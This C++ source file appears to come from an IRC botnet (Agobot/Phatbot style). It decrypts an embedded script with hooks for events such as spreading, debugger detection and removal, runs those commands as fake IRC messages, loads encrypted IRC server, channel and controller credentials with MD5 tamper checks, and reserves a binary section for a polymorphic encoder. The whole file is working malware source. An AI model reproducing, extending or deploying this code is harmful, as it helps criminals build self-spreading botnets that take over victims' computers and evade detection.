#include "main.h"
#include "bot.h"
#include "mainctrl.h"
#include "smtp_logic.h"
#include "utility.h"

#include "config.h"

char *g_szSectionName=SECTION_NAME;

list<scriptcmd> g_lScriptCmds;

bool ParseScript(const char *szScript) {
	CString sScript(szScript); bool bGetScript=false; unsigned long lScriptType;
	int iLineNum=0; CString sCurLine=sScript.Token(iLineNum, "\n");
	while(sCurLine.Compare("")) {
		if(sCurLine.GetLength()) if(!bGetScript) {
			if(!sCurLine.Token(0, " ").CompareNoCase("onstart")) {
				// If there is no { after the script name, dont parse
				if(!sCurLine.Token(1, " ").Compare("{")) {
					bGetScript=true; lScriptType=SCRIPT_ONSTART;
				}
			} else if(!sCurLine.Token(0, " ").CompareNoCase("onconnect")) {
				if(!sCurLine.Token(1, " ").Compare("{")) {
					bGetScript=true; lScriptType=SCRIPT_ONCONNECT;
				}
			} else if(!sCurLine.Token(0, " ").CompareNoCase("onjoin")) {
				if(!sCurLine.Token(1, " ").Compare("{")) {
					bGetScript=true; lScriptType=SCRIPT_ONJOIN;
				}
			} else if(!sCurLine.Token(0, " ").CompareNoCase("onlogin")) {
				if(!sCurLine.Token(1, " ").Compare("{")) {
					bGetScript=true; lScriptType=SCRIPT_ONLOGIN;
				}
			} else if(!sCurLine.Token(0, " ").CompareNoCase("ondisconnect")) {
				if(!sCurLine.Token(1, " ").Compare("{")) {
					bGetScript=true; lScriptType=SCRIPT_ONDISCON;
				}
			} else if(!sCurLine.Token(0, " ").CompareNoCase("onremove")) {
				if(!sCurLine.Token(1, " ").Compare("{")) {
					bGetScript=true; lScriptType=SCRIPT_ONREMOVE;
				}
			} else if(!sCurLine.Token(0, " ").CompareNoCase("onspread")) {
				if(!sCurLine.Token(1, " ").Compare("{")) {
					bGetScript=true; lScriptType=SCRIPT_ONSPREAD;
				}
			} else if(!sCurLine.Token(0, " ").CompareNoCase("ondebugeractive")) {
				if(!sCurLine.Token(1, " ").Compare("{")) {
					bGetScript=true; lScriptType=SCRIPT_ONDEBUG;
				}
			} else if(!sCurLine.Token(0, " ").CompareNoCase("onstartupfin")) {
				if(!sCurLine.Token(1, " ").Compare("{")) {
					bGetScript=true; lScriptType=SCRIPT_ONSTARTUPFIN;
				}
			} else if(!sCurLine.Token(0, " ").CompareNoCase("ontimer")) {
				// Not implemented yet
			}
		} else {
			// End script on } on a single line
			if(!sCurLine.Token(0, " ").Compare("}")) {
				bGetScript=false;
			} else {
				// Skip tabs
				while(sCurLine.operator [](0)=='\t') {
					CString sTemp=sCurLine.Mid(1);
					sCurLine.Assign(sTemp);
				}
				scriptcmd cmd;
				cmd.lScriptType=lScriptType;
				cmd.sScriptCmd=sCurLine;
				g_lScriptCmds.push_back(cmd);
			}
		}

		iLineNum++; sCurLine=sScript.Token(iLineNum, "\n"); }

	return true;
}

bool CheckMD5(const char *szMD5In, const char *szValue) {
	// If the md5 isn't empty
	if(strcmp(szMD5In, "")) {
		// Calculate the md5 of the value
		md5::MD5_CTX md5; md5::MD5Init(&md5); unsigned char szMD5[16];
		md5::MD5Update(&md5, (unsigned char*)szValue, strlen(szValue));
		md5::MD5Final(szMD5, &md5);
		// Compare the values
		if(!memcmp(szMD5In, szMD5, sizeof(szMD5)))
			return true;
		else
			return false;
	} else return true;

	return false; }

void CBot::RunScript(unsigned long lEvent) {
	list<scriptcmd>::iterator isc;

	for(isc=g_lScriptCmds.begin(); isc!=g_lScriptCmds.end(); isc++) {
		if((*isc).lScriptType!=lEvent) continue;
		CMessage mFakeMsg;
		mFakeMsg.sChatString.Assign((*isc).sScriptCmd);
		mFakeMsg.sReplyTo.Assign(g_pMainCtrl->m_pBot->si_mainchan.sValue);

		if(mFakeMsg.sChatString.Find(" -s")) mFakeMsg.bSilent=true; else mFakeMsg.bSilent=false;
		if(mFakeMsg.sChatString.Find(" -n")) {
			mFakeMsg.bNotice=true;
			CString sOutchan;
			sOutchan.Assign(mFakeMsg.sChatString.Mid(mFakeMsg.sChatString.Find(" -n")+3));
			mFakeMsg.sReplyTo.Assign(sOutchan);
			mFakeMsg.sDest.Assign(sOutchan);
		}	
		else mFakeMsg.bNotice=false;
			
		if(mFakeMsg.sChatString.Find(" -o")) {
			mFakeMsg.bOutchan=true;
			mFakeMsg.bNotice=true;
			CString sOutchan;
			sOutchan.Assign(mFakeMsg.sChatString.Mid(mFakeMsg.sChatString.Find(" -o")+3));
			mFakeMsg.sReplyTo.Assign(sOutchan);
			mFakeMsg.sDest.Assign(sOutchan);
			} 
		else mFakeMsg.bOutchan=false;

		mFakeMsg.sCmd.Assign((*isc).sScriptCmd.Token(0, " ").Mid(1));
		mFakeMsg.sHost.Assign("AutoStart.Net");
		mFakeMsg.sIdentd.Assign("AutoStart");
		mFakeMsg.sSrc.Assign("AutoStart");
		mFakeMsg.pReply=g_pMainCtrl->m_pIRC;
			
		g_pMainCtrl->m_pBot->HandleMsgInt(&mFakeMsg);
	}
}

void CBot::Config()
{	int i=0;

	CString sScriptEnc(g_szScript);
	strncpy(sScriptEnc.m_szKey, g_szScriptKey, sizeof(sScriptEnc.m_szKey));
	sScriptEnc.m_bIsCryptStr=true;

	CString sScriptDec=sScriptEnc.Decrypt();

	ParseScript(sScriptDec.CStr());

	list<scriptcmd>::iterator isc;
	for(isc=g_lScriptCmds.begin(); isc!=g_lScriptCmds.end(); isc++) {
		char *szBla=(*isc).sScriptCmd;
	}

	int iNumCVars=sizeof(g_aCVars)/sizeof(conf_cvar);
	int iNumUsers=sizeof(g_aUsers)/sizeof(conf_user);

	for(i=0; i<iNumCVars; i++) {
		// Find the cvar
		cvar *pCVar=g_pMainCtrl->m_pCVar->FindCvarByName(g_aCVars[i].szName, true);
		// Skip to the next cvar if none is registered
		if(!pCVar) continue;
		// Copy the values of the cvars over
		g_pMainCtrl->m_pCVar->SetCVar(pCVar, g_aCVars[i].szValue, g_aCVars[i].szCryptKey);
		// Check the hash
		if(!CheckMD5(g_aCVars[i].szMD5, g_aCVars[i].szValue))
			g_pMainCtrl->m_bHashCheckFailed=true;
	}

	for(i=0; i<iNumUsers; i++) {
		cvar *pTempUser=g_pMainCtrl->m_pCVar->TempCvar(g_aUsers[i].cUsername.szName, g_aUsers[i].cUsername.szValue, g_aUsers[i].cUsername.szCryptKey);
		cvar *pTempPass=g_pMainCtrl->m_pCVar->TempCvar(g_aUsers[i].cPasswordMD5.szName, g_aUsers[i].cPasswordMD5.szValue, g_aUsers[i].cPasswordMD5.szCryptKey);
		cvar *pTempHost=g_pMainCtrl->m_pCVar->TempCvar(g_aUsers[i].cHostmask.szName, g_aUsers[i].cHostmask.szValue, g_aUsers[i].cHostmask.szCryptKey);
		cvar *pTempIdentd=g_pMainCtrl->m_pCVar->TempCvar(g_aUsers[i].cIdentdmask.szName, g_aUsers[i].cIdentdmask.szValue, g_aUsers[i].cIdentdmask.szCryptKey);
		if(!CheckMD5(g_aUsers[i].cUsername.szMD5, g_aUsers[i].cUsername.szValue))
			g_pMainCtrl->m_bHashCheckFailed=true;
		if(!CheckMD5(g_aUsers[i].cPasswordMD5.szMD5, g_aUsers[i].cPasswordMD5.szValue))
			g_pMainCtrl->m_bHashCheckFailed=true;
		if(!CheckMD5(g_aUsers[i].cHostmask.szMD5, g_aUsers[i].cHostmask.szValue))
			g_pMainCtrl->m_bHashCheckFailed=true;
		if(!CheckMD5(g_aUsers[i].cIdentdmask.szMD5, g_aUsers[i].cIdentdmask.szValue))
			g_pMainCtrl->m_bHashCheckFailed=true;
		ADDUSER(pTempUser->sValue, pTempPass->sValue, pTempHost->sValue, pTempIdentd->sValue);
	}

}

void CBot::Autostart()
{	int i=0;

	int iNumServers=sizeof(g_aServers)/sizeof(conf_server);

	for(i=0; i<iNumServers; i++) {
		irc_server *pServer=new irc_server;
		pServer->si_chanpass=g_pMainCtrl->m_pCVar->TempCvar(g_aServers[i].cChanPass.szName, g_aServers[i].cChanPass.szValue, g_aServers[i].cChanPass.szCryptKey);
		pServer->si_mainchan=g_pMainCtrl->m_pCVar->TempCvar(g_aServers[i].cMainChan.szName, g_aServers[i].cMainChan.szValue, g_aServers[i].cMainChan.szCryptKey);
		pServer->si_nickprefix=g_pMainCtrl->m_pCVar->TempCvar(g_aServers[i].cNickPrefix.szName, g_aServers[i].cNickPrefix.szValue, g_aServers[i].cNickPrefix.szCryptKey);
		pServer->si_port=g_pMainCtrl->m_pCVar->TempCvar(g_aServers[i].cPort.szName, g_aServers[i].cPort.szValue, g_aServers[i].cPort.szCryptKey);
		pServer->si_server=g_pMainCtrl->m_pCVar->TempCvar(g_aServers[i].cServer.szName, g_aServers[i].cServer.szValue, g_aServers[i].cServer.szCryptKey);
		pServer->si_servpass=g_pMainCtrl->m_pCVar->TempCvar(g_aServers[i].cServPass.szName, g_aServers[i].cServPass.szValue, g_aServers[i].cServPass.szCryptKey);
		pServer->si_usessl=g_pMainCtrl->m_pCVar->TempCvar(g_aServers[i].cUseSSL.szName, g_aServers[i].cUseSSL.szValue, g_aServers[i].cUseSSL.szCryptKey);
		if(!CheckMD5(g_aServers[i].cChanPass.szMD5, g_aServers[i].cChanPass.szValue))
			g_pMainCtrl->m_bHashCheckFailed=true;
		if(!CheckMD5(g_aServers[i].cMainChan.szMD5, g_aServers[i].cMainChan.szValue))
			g_pMainCtrl->m_bHashCheckFailed=true;
		if(!CheckMD5(g_aServers[i].cNickPrefix.szMD5, g_aServers[i].cNickPrefix.szValue))
			g_pMainCtrl->m_bHashCheckFailed=true;
		if(!CheckMD5(g_aServers[i].cServer.szMD5, g_aServers[i].cServer.szValue))
			g_pMainCtrl->m_bHashCheckFailed=true;
		if(!CheckMD5(g_aServers[i].cServPass.szMD5, g_aServers[i].cServPass.szValue))
			g_pMainCtrl->m_bHashCheckFailed=true;
		g_pMainCtrl->m_pIRC->m_vServers.push_back(pServer);
	}

	// TODO: Add Autostart here
}

#ifdef WIN32

#pragma warning(disable:4068)
#pragma data_seg(SECTION_NAME)
// You can try smaller size here. This will make the bot smaller,
// but make it so the encoder still fits in, else no polymorph will
// be done.
__declspec(allocate(SECTION_NAME)) char szBuf[16384];

#endif // WIN32
